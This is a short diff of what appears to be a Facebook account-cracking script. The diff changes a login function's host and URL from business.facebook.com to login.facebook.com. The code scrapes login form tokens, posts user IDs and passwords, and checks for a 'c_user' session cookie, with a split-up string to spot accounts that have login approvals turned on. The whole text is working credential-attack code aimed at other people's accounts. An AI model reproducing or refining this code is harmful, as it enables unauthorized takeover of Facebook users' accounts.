@@ -2098,7 +2098,7 @@ def mobile(uid,pwx,tl):
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
             headers ={
-            'Host': 'business.facebook.com',
+            'Host': 'login.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
             'scheme': 'https',
@@ -2128,7 +2128,7 @@ def mobile(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://login.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
